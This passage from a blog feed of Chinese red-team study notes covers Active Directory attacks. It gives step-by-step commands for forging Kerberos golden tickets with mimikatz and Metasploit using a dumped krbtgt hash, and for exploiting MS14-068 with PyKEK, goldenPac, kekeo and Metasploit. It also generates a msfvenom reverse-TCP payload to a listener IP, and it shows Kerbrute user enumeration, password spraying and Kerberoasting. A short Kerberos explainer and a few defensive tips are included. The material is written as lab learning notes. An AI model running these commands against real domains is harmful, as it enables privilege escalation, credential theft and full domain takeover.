参数，可以只导出指定用户的值。</p><p>或者使用以下命令获取 krbtgt 的 NTLM Hash ，域 SID 值，但该命令无法获取 AES-256 的值</p><pre class="line-numbers language-none"><code class="language-none">privilege::debuglsadump::lsa &#x2F;patch &#x2F;user:krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="2、获取基本信息"><a href="#2、获取基本信息" class="headerlink" title="2、获取基本信息"></a>2、获取基本信息</h2><p>获取域 SID</p><pre class="line-numbers language-none"><code class="language-none">wmic useraccount get name,sid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里得到 administrator 的 SID 为  S-1-5-21-284927032-1122706408-2778656994-500，即表示当前域的 SID 就是 S-1-5-21-284927032-1122706408-2778656994</p><p>获取当前用户的 SID</p><pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询域管理员账号</p><pre class="line-numbers language-none"><code class="language-none">net group &quot;domain admins&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询域名</p><pre class="line-numbers language-none"><code class="language-none">ipconfig &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3、制作黄金票据"><a href="#3、制作黄金票据" class="headerlink" title="3、制作黄金票据"></a>3、制作黄金票据</h2><p>先将票据清空</p><pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成票据</p><pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;admin:Administrator &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;krbtgt:d685b9c4fa2d318a9943ed68948af087 &#x2F;ticket:Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>传递票据并注入内存</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptt Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4、验证权限"><a href="#4、验证权限" class="headerlink" title="4、验证权限"></a>4、验证权限</h2><p>退出 mimikatz ，使用 dir 发现可以成功列出域控文件</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109271559013.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>这里使用 PsExec 也同样是能获取到权限的，除了上面使用 NTLM Hash 之外，还可以使用 krbtgt 的 AES-256 值生成黄金票据</p><pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;admin:Administrator &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;aes256:3dfa1f9b5809250a7670c12d1e109f0acb9660f902da8aa3a4be55a16affbbd5 &#x2F;ticket:Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>命令完成之后，也会生成一个 Administrator.kiribi 文件，之后的操作就都一样了。</p><h2 id="5、MSF-下的利用"><a href="#5、MSF-下的利用" class="headerlink" title="5、MSF 下的利用"></a>5、MSF 下的利用</h2><p>首先上线一个普通用户，然后加载 kiwi 模块</p><pre class="line-numbers language-none"><code class="language-none">load kiwi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成黄金票据</p><pre class="line-numbers language-none"><code class="language-none">golden_ticket_create -d teamssix.com -k d685b9c4fa2d318a9943ed68948af087 -s S-1-5-21-284927032-1122706408-2778656994 -u administrator -t &#x2F;root&#x2F;administrator.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将黄金票据注入内存</p><pre class="line-numbers language-none"><code class="language-none">kerberos_ticket_use &#x2F;root&#x2F;administrator.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注入成功后，进入 Shell 就能查看 dc 里的文件了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109271628454.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考文章：</p><p><a href="https://www.freebuf.com/articles/web/274035.html">https://www.freebuf.com/articles/web/274035.html</a></p><p>原文链接：</p><p><a href="https://teamssix.com/210927-163036.html">https://teamssix.com/210927-163036.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】27、Kerberos 域用户提权漏洞</title>
      <link href="//210924-100520.html"/>
      <url>//210924-100520.html</url>
      
        <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>在 2014 年微软修复了 Kerberos 域用户提权漏洞，即 MS14-068，CVE 编号为 CVE-2014-6324，该漏洞影响了 Windows Server 2012 R2 以下的服务器，该漏洞允许 RT 将任意用户权限提升至域管级别。</p><p>不过从漏洞年代就知道这已经是个远古时代的漏洞，现实中已经很少会碰到了，这里就简单记录下，顺便熟悉熟悉工具的用法。</p><p>14-068 产生的原因主要在于用户可以利用伪造的票据向认证服务器发起请求，如果用户伪造域管的票据，服务端就会把拥有域管权限的服务票据返回回来。</p><h2 id="1、PyKEK"><a href="#1、PyKEK" class="headerlink" title="1、PyKEK"></a>1、PyKEK</h2><p>PyKEK 是一个利用 Kerberos 协议进行渗透的工具包，下载地址：<a href="https://github.com/mubix/pykek">https://github.com/mubix/pykek</a></p><p>使用 PyKEK 可以生成一个高权限的服务票据，之后通过 mimikatz 将服务票据导入到内存中。</p><p>MS 14-068 的补丁为：KB3011780，通过 wmic 查看补丁情况</p><pre class="line-numbers language-none"><code class="language-none">wmic qfe get hotfixid | findstr KB3011780<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看当前用户 SID</p><pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 wmic </p><pre class="line-numbers language-none"><code class="language-none">wmic useraccount get name,sid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成高权限票据，-d 指定域控地址</p><pre class="line-numbers language-none"><code class="language-none">python2 ms14-068.py -u jack@0day.org -s S-1-5-21-1812960810-2335050734-3517558805-1133 -d 192.168.3.142 -p Aa123456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开 mimikatz 清除当前内存中的票据信息</p><pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将高权限票据注入内存</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptc &quot;TGT_jack@0day.org.ccache&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 net use 连接域控后，使用 psexec 获取 Shell</p><blockquote><p>这里 net ues 使用 IP 可能会失败，因此在此使用机器名进行连接 </p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109231733653.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、GoldenPac"><a href="#2、GoldenPac" class="headerlink" title="2、GoldenPac"></a>2、GoldenPac</h2><p>goldenPac.py 是一个用于对 Kerberos 协议进行测试的工具，它集成在 impacket 工具包里。</p><p>Kali 在使用之前需要先安装 Kerberos 客户端</p><pre class="line-numbers language-none"><code class="language-none">apt-get install krb5-user -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用 goldenPac.py 获取 Shell</p><pre class="line-numbers language-none"><code class="language-none">python3 goldenPac.py 0day.org&#x2F;jack:Aa123456@OWA2010SP3.0day.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这里使用 IP 进行连接会连接不成功，只能使用主机名，因此可以在 hosts 文件中添加主机名对应的 IP</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109231746641.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>goldenPac.py 是通过 PsExec 获得 Shell 的，因此会产生大量的日志，而且现在这种连接方式也已经被各大杀软所拦截。</p><h2 id="3、kekeo"><a href="#3、kekeo" class="headerlink" title="3、kekeo"></a>3、kekeo</h2><p>kekeo 也是一个工具集，其中包含了 ms14-068 的利用模块，kekeo 下载地址：<a href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p><p>使用之前需要先清除票据</p><pre class="line-numbers language-none"><code class="language-none">klist purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后直接使用 kekeo 生成高权限票据</p><pre class="line-numbers language-none"><code class="language-none">kekeo.exe &quot;exploit::ms14068 &#x2F;domain:0day.org &#x2F;user:jack &#x2F;password:Aa123456 &#x2F;ptt&quot; &quot;exit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后就可以直接 dir 域控或者 PsExec 连接到域控了</p><h2 id="4、MSF"><a href="#4、MSF" class="headerlink" title="4、MSF"></a>4、MSF</h2><p>MSF 中也有 MS 14-086 的提权 EXP，不过需要结合 mimikatz 进行利用</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;admin&#x2F;kerberos&#x2F;ms14_068_kerberos_checksumset domain 0day.orgset password Aa123456set user jackset user_sid  S-1-5-21-1812960810-2335050734-3517558805-1133set rhosts OWA2010SP3.0day.orgrun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置好域名、域控 IP、密码、用户、SID 后运行，将会获取一个 bin 文件</p><p>由于 MSF 里不支持 bin 文件的导入，因此需要 mimikatz 对其进行格式转换</p><pre class="line-numbers language-none"><code class="language-none">kerberos::clist &quot;20210923061821_default_192.168.3.142_windows.kerberos_484249.bin&quot; &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后，生成一个木马</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;172.16.214.74 lport&#x3D;4444 -f exe &gt; shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将木马复制到目标主机上，并使其上线到 MSF</p><p>获得会话后，将刚才 mimikatz 转换后的 kirbi 文件导入到会话中</p><pre class="line-numbers language-none"><code class="language-none">load kiwikerberos_ticket_use &#x2F;tmp&#x2F;0-00000000-jack@krbtgt-0DAY.ORG.kirbibackground<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>之后使用 current_user_psexec 模块</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;current_user_psexecset session 2set rhosts OWA2010SP3.0day.orgset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 172.16.214.74run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就会返回高权限的会话</p><blockquote><p>不过 MSF 在使用过程中报错了，网上一查发现别人也有这个错误，暂时还不清楚解决的方法</p></blockquote><h2 id="5、CS"><a href="#5、CS" class="headerlink" title="5、CS"></a>5、CS</h2><p>先利用前面的 ms14-068.py 生成一个 ccache 文件，之后使用 KrbCredExport 将 ccache 文件转为 kirbi 格式</p><p>KrbCredExport 下载地址：<a href="https://github.com/rvazarkar/KrbCredExport">https://github.com/rvazarkar/KrbCredExport</a></p><pre class="line-numbers language-none"><code class="language-none">python2 KrbCredExport.py TGT_jack@0day.org.ccache user.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着使用 CS 的 kerberos_ticket_use 加载 ticket，之后就能访问到域控了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109240943968.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>此时想让域控上线自然也是没问题的了，可以先添加一个域控地址的 target，然后选择 PsExec ，勾选上 use session’s current access token 通过 jack 的会话上线即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109241000974.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考文章：</p><p><a href="https://www.jianshu.com/p/27730ab4a6db">https://www.jianshu.com/p/27730ab4a6db</a></p><p><a href="https://www.cnblogs.com/websecyw/p/11835830.html">https://www.cnblogs.com/websecyw/p/11835830.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos 协议详解与利用</title>
      <link href="//210923-151418.html"/>
      <url>//210923-151418.html</url>
      
        <content type="html"><![CDATA[<h1 id="一、Kerberos-协议"><a href="#一、Kerberos-协议" class="headerlink" title="一、Kerberos 协议"></a>一、Kerberos 协议</h1><p>Kerberos 原意是希腊神话中看守冥界入口的恶犬刻耳柏洛斯，类似于「哈利波特·神秘魔法石」中守护魔法石的三头犬毛毛。</p><p>这里所讲的 Kerberos 是一种网络身份认证协议，个人猜测作者采用这个名字也正是为了体现出该协议里身份认证的特性，即通过 Kerberos 协议守护网络通信中的安全，下面就来详细看看 Kerberos 协议。</p><p>Kerberos 是一种由 MIT 提出用来在非安全网络中对个人通信进行身份认证的计算机网络授权协议，该协议使用 AES 对称加密算法为客户端和服务端之间提供强身份认证，在域环境下的身份认证利用的就是 Kerberos 协议。</p><p>在计算机通讯中，当客户端去访问服务端时，作为服务端需要判断对方是否有权限访问自己主机上的服务，作为安全人员我们想保证整个过程即使被拦截或者篡改也不会影响数据的安全性，Kerberos 协议正是为了解决这些问题而产生的。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210906154732.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>上图是 Kerberos 的认证流程，协议中的名词缩写解释如下：</p><ul><li>AS (Authentication Service): 认证服务器</li><li>TGS (Ticket Granting Service): 票据授予服务器</li><li>KDC (Key Distribution Center): 密钥分发中心</li><li>TGT (Ticket Granting Ticket): 票据授权票据，或者说：票据的票据</li><li>ST (Servre Ticket): 服务票据</li></ul><p>根据上图，总共分为 6 步，这里一步一步进行解释</p><h2 id="第一阶段：客户端-Clinet-与认证服务器-AS-通信"><a href="#第一阶段：客户端-Clinet-与认证服务器-AS-通信" class="headerlink" title="第一阶段：客户端 Clinet 与认证服务器 AS 通信"></a>第一阶段：客户端 Clinet 与认证服务器 AS 通信</h2><p>首先用户在客户端输入自己的用户名和密码，此时客户端会将用户输入的密码转换为哈希值，这个哈希值就是客户端用户的<strong>用户密钥</strong>。</p><p>① 第一步，客户端向认证服务器发起请求，请求内容为自己的用户名、客户端地址和当前时间戳。</p><blockquote><p>此时客户端不会向认证服务器发送用户密钥，认证服务器会利用自己的本地数据库里对应客户端用户的密码生成用户密钥。</p></blockquote><p>② 第二步，认证服务器接收到客户端的请求，此时认证服务器会根据客户端传来的用户名在本地数据库中查找这个用户名。</p><blockquote><p>此时认证服务器只会查找具有相同用户名的用户，并不会判断客户端身份的可靠性。</p></blockquote><p>如果没有这个用户名，认证失败；如果存在该用户名，则认证服务器会认为用户存在，此时认证服务器会向客户端发送两条信息，分别如下：</p><ul><li>第一条信息：<strong>客户端与票据授予服务器的会话密钥。</strong>该会话密钥通过用户密钥进行加密，这个用户密钥就是认证服务器利用自己的本地数据库里对应客户端用户的密码生成的，该条消息中除了会话密钥还有票据授予服务器的地址和时间戳。</li><li>第二条信息：<strong>票据授权票据。</strong>票据授权票据通过票据授予服务器的密钥进行加密，票据授权票据里包括了第一条消息里的会话密钥、用户名、客户端地址、票据授权票据的有效时间以及时间戳。</li></ul><p>在客户端收到认证服务器的响应后，会尝试使用自己的用户密钥解密第一条消息，如果解密成功则会获得客户端与票据授予服务器的会话密钥以及时间戳等信息。接着客户端会判断时间戳是否在 5 分钟以内，如果大于 5 分钟则认为认证服务器是伪造的，小于 5 分钟则继续下一步认证。</p><p>至此，第一阶段通信完成。</p><h2 id="第二阶段：客户端-Clinet-与票据授予服务器-TGS-通信"><a href="#第二阶段：客户端-Clinet-与票据授予服务器-TGS-通信" class="headerlink" title="第二阶段：客户端 Clinet 与票据授予服务器 TGS 通信"></a>第二阶段：客户端 Clinet 与票据授予服务器 TGS 通信</h2><p>③ 第三步，客户端向票据授予服务器发起请求，请求里包含了两条信息：</p><ul><li>第一条信息：上一步认证服务器返回的第二条信息即票据授予票据，以及自己想要访问的服务 ID</li><li>第二条消息：使用客户端与票据授予服务器的会话密钥加密的用户名、时间戳。</li></ul><p>④ 第四步，票据授予服务器接收到请求，首先票据授予服务器会判断密钥分发中心的数据库中是否存在客户端想要访问的服务，如果不存在，认证失败，如果存在则继续接下来的认证。</p><p>接下来票据授予服务器会解密票据授予票据的内容，此时票据授予服务器获取到用户名、客户端与票据授予服务器的会话密钥、时间戳信息。</p><p>之后票据授予服务器使用客户端与票据授予服务器的会话密钥解密客户端发来的第二条信息，取出其中的用户名和票据授予票据里的用户信息进行对比，这里也会去判断取出的时间戳是否正常，如果全部没问题则认为客户端身份正常，继续下一步。</p><p>此时票据授予服务器向客户端发起响应，响应信息包含两条信息：</p><ul><li>第一条信息：<strong>使用服务端的密钥加密的服务票据</strong>，其中包括用户名、客户端 IP、客户端要访问的服务端信息、服务票据的有效时间、时间戳以及客户端与服务端的会话密钥。</li><li>第二条信息：<strong>使用客户端和票据授予服务器的会话密钥加密的内容</strong>，其中包括客户端和服务端的会话密钥、时间戳和服务票据的有效时间。</li></ul><p>在客户端收到票据授予服务器的响应后，会使用客户端和票据授予服务器的会话密钥解密收到的第二条信息，得到客户端和服务端的会话密钥，用于接下来的通信。这里同样的也会检查时间戳是否有误，值的注意的是这里客户端是无法解密返回的第一条信息的，因为第一条信息是利用服务端的密钥加密的。</p><p>至此，第二阶段通信完成。</p><h2 id="第三阶段：客户端-Clinet-与-服务端-Server-通信"><a href="#第三阶段：客户端-Clinet-与-服务端-Server-通信" class="headerlink" title="第三阶段：客户端 Clinet 与 服务端 Server 通信"></a>第三阶段：客户端 Clinet 与 服务端 Server 通信</h2><p>⑤ 第五步，客户端向服务端发送请求，请求内容包括两条信息：</p><ul><li>第一部分：上一步里票据授予服务器返回的使用服务端的密钥加密的服务票据。</li><li>第二部分：使用客户端和服务端的密钥加密的用户名和时间戳信息。</li></ul><p>⑥ 第六步，服务端解密出收到信息的第一部分内容，核对时间戳之后，取出客户端和服务端的会话密钥，利用客户端和服务端的会话密钥解密第二部分内容，获得用户名信息。</p><p>此时服务端会将第一部分解密后的信息与第二部分解密后的信息进行对比，如果一致则说明该客户端身份为真实身份，此时服务端向客户端响应使用客户端和服务端的会话密钥加密的表示验证通过的信息以及时间戳，客户端接受到响应后，验证时间戳正确后，便会认为这个服务端是可信任的了。</p><p>至此，第三阶段通信完成，到这里整个 Kerberos 认证也就完成了，接下来客户端与服务端就能放心的进行通信了。</p><h1 id="二、Kerberos-协议的利用"><a href="#二、Kerberos-协议的利用" class="headerlink" title="二、Kerberos 协议的利用"></a>二、Kerberos 协议的利用</h1><h2 id="1、用户名枚举"><a href="#1、用户名枚举" class="headerlink" title="1、用户名枚举"></a>1、用户名枚举</h2><p>当用户名输入正确或错误时，Kerberos 协议所返回的状态码是不同的，利用这一特性可以进行用户名枚举，这里使用 Kerbrute 工具进行演示。</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">kerbrute userenum <span class="token punctuation">-</span><span class="token punctuation">-</span>dc 192.168.7.7 <span class="token punctuation">-</span>d teamssix.com users.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109231512850.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、密码喷洒"><a href="#2、密码喷洒" class="headerlink" title="2、密码喷洒"></a>2、密码喷洒</h2><p>密码喷洒和用户名枚举原理一样，而且使用 Kerberos 协议对 Windows 密码进行暴力破解比其他方法要快得多，并且更加隐蔽，因为 Kerberos 身份验证即使失败也不会触发 4625 登录失败事件。</p><p>这里同样使用 Kerbrute 工具进行演示。</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">kerbrute passwordspray <span class="token punctuation">-</span><span class="token punctuation">-</span>dc 192.168.7.7 <span class="token punctuation">-</span>d teamssix.com users.txt 1qaz@WSX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109231512431.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="3、Kerberoast"><a href="#3、Kerberoast" class="headerlink" title="3、Kerberoast"></a>3、Kerberoast</h2><blockquote><p>关于 Kerberoast 和 SPN 的详细介绍可以参考我之前的文章：<a href="https://teamssix.com/210907-121204.html">https://teamssix.com/210907-121204.html</a></p></blockquote><p>Kerberoast 是一种针对 Kerberos 协议的利用方式，在需要使用某个服务向票据授予服务器发送请求时（即上述 Kerberos 协议里第 ③ 步），用户首先需要有个有效的票据授予票据。</p><p>当票据授予票据被验证有效且具有该服务的权限时，票据授予服务器会向用户返回使用服务端密钥加密的服务票据，该服务票据使用与该服务相关联计算机账号的密码加密，因此 RT 可以对加密后的内容进行离线哈希破解。</p><p><strong>Kerberoast 的利用思路：</strong><br>i. 查询 SPN<br>ii. 请求并导出服务票据<br>iii. 对服务票据进行爆破</p><blockquote><p>这里使用 Kerberoast 工具包作为演示，以下工具均在 Kerberoast 工具包里。</p></blockquote><h3 id="i-查询-SPN"><a href="#i-查询-SPN" class="headerlink" title="i. 查询 SPN"></a>i. 查询 SPN</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">.</span><span class="token operator">/</span>GetUserSPNs<span class="token punctuation">.</span>ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到 test 用户有个 MSSQLSvc/DBSRV.teamssix.com:1433 服务</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109231512937.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="ii-请求并导出服务票据"><a href="#ii-请求并导出服务票据" class="headerlink" title="ii. 请求并导出服务票据"></a>ii. 请求并导出服务票据</h3><p>这里请求 MSSQLSvc/DBSRV.teamssix.com:1433 服务并导出服务票据</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Add<span class="token operator">-</span>Type <span class="token operator">-</span>AssemblyName System<span class="token punctuation">.</span>IdentityModel  New<span class="token operator">-</span>Object System<span class="token punctuation">.</span>IdentityModel<span class="token punctuation">.</span>Tokens<span class="token punctuation">.</span>KerberosRequestorSecurityToken <span class="token operator">-</span>ArgumentList <span class="token string">"MSSQLSvc/DBSRV.teamssix.com:1433"</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以使用 klist 查看新的是否有票据缓存，有的话就可以使用 mimikatz 导出票据了</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">kerberos<span class="token operator">:</span><span class="token operator">:</span>list <span class="token operator">/</span><span class="token keyword">export</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109231513202.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="iii-对服务票据进行爆破"><a href="#iii-对服务票据进行爆破" class="headerlink" title="iii. 对服务票据进行爆破"></a>iii. 对服务票据进行爆破</h3><p>使用 Kerberoast 工具包里的 tgsrepcrack.py 就可以破解</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">python tgsrepcrack<span class="token punctuation">.</span>py password<span class="token punctuation">.</span>txt mssql<span class="token punctuation">.</span>kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109231513659.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="三、防范思路"><a href="#三、防范思路" class="headerlink" title="三、防范思路"></a>三、防范思路</h1><p>1、密码设置为复杂密码</p><p>2、在进行日志审计时，可以重点关注 ID 为 4769（请求 Kerberos 服务票据）的日志，如果有较多的 4769 日志，应进一步检查系统中是否存在恶意行为。</p><p>3、 Kerberos 协议的默认加密方式是 AES256_HMAC，而服务票据只有在加密方式是 RC4_HMAC_MD5 时才能破解，因此可以对当前系统的加密方式进行检查，看看是否为 AES256_HMAC 的加密方式。</p><blockquote><p>参考文章：</p><p><a href="https://zh.wikipedia.org/wiki/Kerberos">https://zh.wikipedia.org/wiki/Kerberos</a></p><p><a href="https://teamssix.com/210907-121204.html">https://teamssix.com/210907-121204.html</a></p><p><a href="https://www.jianshu.com/p/23a4e8978a30">https://www.jianshu.com/p/23a4e8978a30</a></p><p><a href="https://zh.wikipedia.org/wiki/%E5%88%BB%E8%80%B3%E6%9F%8F%E6%B4%9B%E6%96%AF">https://zh.wikipedia.org/wiki/%E5%88%BB%E8%80%B3%E6%9F%8F%E6%B4%9B%E6%96%AF</a></p><p><a href="https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/">https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3Kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】26、ntds.dit 的提取与散列值导出</title>
      <link href="//210909-215110.html"/>
      <url>//210909-215110.html</url>
      
